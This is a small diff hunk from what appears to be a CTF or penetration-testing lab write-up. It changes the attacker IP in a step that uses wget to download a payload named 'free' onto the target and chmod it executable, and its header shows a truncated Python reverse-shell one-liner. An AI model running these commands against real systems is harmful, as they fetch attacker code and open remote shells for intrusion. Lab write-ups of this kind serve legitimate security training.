@@ -333,7 +333,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 2. Transfer it on the target and make it executable:
 ~~~
-theseus@ubuntu:/var/tmp$ wget http://10.10.14.23/free
+theseus@ubuntu:/var/tmp$ wget http://10.10.14.20/free
 theseus@ubuntu:/var/tmp$ chmod 755 free
 ~~~
 
